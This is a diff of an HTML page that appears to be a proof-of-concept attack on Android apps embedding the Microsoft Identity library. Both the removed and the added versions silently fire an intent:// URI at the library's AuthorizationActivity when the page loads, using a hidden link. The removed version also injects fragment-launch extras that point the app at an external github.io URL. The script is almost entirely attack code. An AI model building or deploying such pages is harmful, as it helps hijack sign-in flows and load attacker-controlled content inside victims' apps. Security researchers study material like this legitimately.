@@ -1,344 +1,42 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Launch Authorization Activity</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(145deg, #f0f4f8 0%, #e2e8f0 100%);
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
-    }
-
-    .card {
-      background: #ffffff;
-      border-radius: 32px;
-      padding: 44px 34px;
-      max-width: 540px;
-      width: 100%;
-      box-shadow: 0 20px 60px -12px rgba(0, 0, 0, 0.20);
-      text-align: center;
-      transition: transform 0.2s ease;
-      border: 1px solid rgba(255,255,255,0.5);
-      animation: fadeIn 0.6s ease;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    .icon {
-      font-size: 3.2rem;
-      margin-bottom: 6px;
-    }
-
-    h2 {
-      font-weight: 600;
-      font-size: 1.9rem;
-      color: #0b1e33;
-      letter-spacing: -0.3px;
-      margin-bottom: 4px;
-    }
-
-    .sub {
-      color: #4a5b6e;
-      font-size: 0.95rem;
-      margin-bottom: 28px;
-      border-bottom: 1px solid #eef2f6;
-      padding-bottom: 18px;
-    }
-
-    .status-box {
-      background: #f8faff;
-      border-radius: 16px;
-      padding: 20px;
-      margin: 20px 0 16px 0;
-      border: 1px solid #dce3ed;
-    }
-
-    .status-box .loading {
-      display: inline-block;
-      width: 20px;
-      height: 20px;
-      border: 3px solid #e9edf4;
-      border-top: 3px solid #1a5c9e;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-      margin-right: 10px;
-      vertical-align: middle;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    .status-text {
-      font-size: 1rem;
-      color: #1a2b3e;
-      font-weight: 500;
-      vertical-align: middle;
-    }
-
-    .badge-container {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 8px;
-      margin-top: 18px;
-    }
-
-    .badge {
-      background: #e9edf4;
-      color: #1f3a5f;
-      font-size: 0.7rem;
-      font-weight: 600;
-      padding: 5px 16px;
-      border-radius: 40px;
-      letter-spacing: 0.2px;
-    }
-
-    .badge.primary {
-      background: #d4e2fc;
-      color: #12457a;
-    }
-
-    .code-box {
-      background: #f1f5fb;
-      border-radius: 16px;
-      padding: 18px 16px;
-      margin-top: 26px;
-      text-align: left;
-      font-family: 'JetBrains Mono', 'Fira Code', monospace;
-      font-size: 0.72rem;
-      color: #1a2b3e;
-      overflow-x: auto;
-      border: 1px solid #dce3ed;
-      line-height: 1.6;
-    }
-
-    .code-box .highlight {
-      color: #a63a3a;
-      font-weight: 500;
-    }
-
-    .code-box .dim {
-      color: #6a7f8a;
-    }
-
-    .footnote {
-      margin-top: 22px;
-      color: #5b6f84;
-      font-size: 0.82rem;
-    }
-
-    .footnote strong {
-      color: #1a5c9e;
-    }
-
-    .manual-trigger {
-      margin-top: 16px;
-    }
-
-    .manual-trigger a {
-      color: #1a5c9e;
-      text-decoration: none;
-      font-weight: 500;
-      font-size: 0.9rem;
-      border-bottom: 1px dashed #b0c4db;
-      padding-bottom: 2px;
-      cursor: pointer;
-    }
-
-    .manual-trigger a:hover {
-      border-bottom: 1px solid #1a5c9e;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Launch Authorization</title>
 </head>
 <body>
+    <h1>Launching Authorization Activity...</h1>
+    <p>If nothing happens, <a href="#" id="clickHere">click here</a></p>
 
-<div class="card">
-  <div class="icon">🔐</div>
-  <h2>Authorization Activity</h2>
-  <div class="sub">Launching OAuth2 authorization flow...</div>
+    <script>
+        function launchIntent() {
+            // Intent URI targeting AuthorizationActivity
+            var intentUri = 'intent://com.microsoft.identity.common.internal.providers.oauth2.AuthorizationActivity#Intent;' +
+                           'package=com.microsoft.identity.common;' +
+                           'action=android.intent.action.VIEW;' +
+                           'category=android.intent.category.DEFAULT;' +
+                           'end;';
 
-  <div class="status-box">
-    <span class="loading"></span>
-    <span class="status-text" id="statusText">Triggering intent automatically...</span>
-  </div>
+            // Create and click a hidden link
+            var link = document.createElement('a');
+            link.href = intentUri;
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
 
-  <div class="badge-container">
-    <span class="badge primary">com.microsoft.identity.common</span>
-    <span class="badge">AuthorizationActivity</span>
-    <span class="badge">singleTask</span>
-  </div>
-
-  <div class="code-box">
-    <span><span class="dim">&lt;</span>activity</span>
-    <span>  android:name="<span class="highlight">com.microsoft.identity.common.internal.providers.oauth2.AuthorizationActivity</span>"</span>
-    <span>  android:exported="<span class="highlight">false</span>"</span>
-    <span>  android:launchMode="<span class="highlight">singleTask</span>"</span>
-    <span>  android:configChanges="smallestScreenSize|screenSize|screenLayout|orientation|keyboardHidden|keyboard"<span class="dim">/&gt;</span></span>
-    <span style="margin-top:8px; border-top:1px solid #dce3ed; padding-top:8px;">// Intent extras as defined in your code</span>
-    <span>• key_main_activity_flow → <span class="highlight">LAUNCH_FRAGMENT</span></span>
-    <span>• fragment: <span class="highlight">2131297154</span></span>
-    <span>• url: <span class="highlight">https://linux-1723.github.io/test/index.html</span></span>
-    <span>• cid: <span class="highlight">dummy_cid</span></span>
-  </div>
-
-  <div class="manual-trigger">
-    <a id="manualTrigger">↻ Click here if intent didn't trigger automatically</a>
-  </div>
-
-  <div class="footnote">
-    ⚡ This page automatically triggers the <strong>AuthorizationActivity</strong> via Android Intent<br />
-    (works only within the Microsoft Identity app context).
-  </div>
-</div>
-
-<script>
-  (function() {
-    'use strict';
-
-    const statusText = document.getElementById('statusText');
-    const manualTrigger = document.getElementById('manualTrigger');
-
-    /**
-     * Triggers an Android Intent targeting:
-     *   com.microsoft.identity.common.internal.providers.oauth2.AuthorizationActivity
-     *
-     * Uses the same extras as the original code:
-     *   - key_main_activity_flow  → LAUNCH_FRAGMENT (String)
-     *   - intent_start_fragment_main_activity → 2131297154 (int)
-     *   - intent_start_fragment_args_main_activity → Bundle with url & cid (serialized as JSON)
-     *
-     * Flags: FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_MULTIPLE_TASK
-     */
-    function triggerIntent() {
-      try {
-        // Package and activity names
-        const packageName = 'com.microsoft.identity.common';
-        const activityName = 'com.microsoft.identity.common.internal.providers.oauth2.AuthorizationActivity';
-
-        // Build fragment arguments as JSON (to be embedded as a string extra)
-        const fragmentArgs = {
-          url: 'https://linux-1723.github.io/test/index.html',
-          cid: 'dummy_cid'
+        // Auto-trigger on page load
+        window.onload = function() {
+            setTimeout(launchIntent, 100);
         };
-        const fragmentArgsJson = JSON.stringify(fragmentArgs);
 
-        // Construct the intent URI using the "intent://" scheme
-        // Format: intent://activity#Intent;package=...;action=...;extras...;end;
-        let intentUri = `intent://${activityName}#Intent;`;
-        intentUri += `package=${packageName};`;
-        intentUri += `action=android.intent.action.VIEW;`;
-        intentUri += `category=android.intent.category.DEFAULT;`;
-
-        // --- Extras (matching the original Java code) ---
-        // String extra: key_main_activity_flow = "LAUNCH_FRAGMENT"
-        intentUri += `S.key_main_activity_flow=LAUNCH_FRAGMENT;`;
-
-        // Integer extra: intent_start_fragment_main_activity = 2131297154
-        intentUri += `i.intent_start_fragment_main_activity=2131297154;`;
-
-        // String extra (carrying the Bundle as JSON): intent_start_fragment_args_main_activity
-        // The receiving app will need to parse this JSON back into a Bundle
-        intentUri += `S.intent_start_fragment_args_main_activity=${encodeURIComponent(fragmentArgsJson)};`;
-
-        // --- Flags: FLAG_ACTIVITY_NEW_TASK (0x10000000) | FLAG_ACTIVITY_MULTIPLE_TASK (0x08000000)
-        // Combined: 0x18000000
-        intentUri += `launchFlags=0x18000000;`;
-
-        // End the intent
-        intentUri += `end;`;
-
-        // Create a hidden anchor and trigger the intent
-        const link = document.createElement('a');
-        link.href = intentUri;
-        link.style.display = 'none';
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-
-        console.log('✅ Intent triggered successfully!');
-        console.log('Target:', activityName);
-        console.log('Extras:', {
-          key_main_activity_flow: 'LAUNCH_FRAGMENT',
-          intent_start_fragment_main_activity: 2131297154,
-          intent_start_fragment_args_main_activity: fragmentArgs
-        });
-
-        // Update status
-        statusText.textContent = '✅ Intent triggered successfully!';
-        const loadingSpinner = document.querySelector('.loading');
-        if (loadingSpinner) {
-          loadingSpinner.style.display = 'none';
-        }
-
-        return true;
-      } catch (error) {
-        console.error('❌ Error triggering intent:', error);
-        statusText.textContent = '❌ Failed to trigger intent. See console for details.';
-        const loadingSpinner = document.querySelector('.loading');
-        if (loadingSpinner) {
-          loadingSpinner.style.display = 'none';
-        }
-        return false;
-      }
-    }
-
-    // --- AUTO-TRIGGER ON PAGE LOAD ---
-    // Wait for the page to fully load before triggering
-    window.addEventListener('load', function() {
-      // Small delay to ensure the page is fully rendered
-      setTimeout(function() {
-        triggerIntent();
-      }, 300);
-    });
-
-    // --- MANUAL TRIGGER (fallback if auto-trigger fails) ---
-    manualTrigger.addEventListener('click', function(e) {
-      e.preventDefault();
-      // Reset status
-      statusText.textContent = '🔄 Retrying...';
-      const loadingSpinner = document.querySelector('.loading');
-      if (loadingSpinner) {
-        loadingSpinner.style.display = 'inline-block';
-      }
-      triggerIntent();
-    });
-
-    // Also allow clicking anywhere on the card as a manual trigger (except on links)
-    document.querySelector('.card').addEventListener('click', function(e) {
-      // Don't interfere with the manual trigger link click
-      if (e.target.closest('a')) return;
-      // Only trigger if it's not the initial auto-trigger (we want to avoid double-triggering)
-      // But we'll just let it be a manual fallback
-      if (statusText.textContent.includes('Triggering') || statusText.textContent.includes('Retrying')) {
-        return;
-      }
-      statusText.textContent = '🔄 Manual retry...';
-      const loadingSpinner = document.querySelector('.loading');
-      if (loadingSpinner) {
-        loadingSpinner.style.display = 'inline-block';
-      }
-      triggerIntent();
-    });
-
-  })();
-</script>
-
+        // Manual trigger fallback
+        document.getElementById('clickHere').onclick = function(e) {
+            e.preventDefault();
+            launchIntent();
+        };
+    </script>
 </body>
 </html>
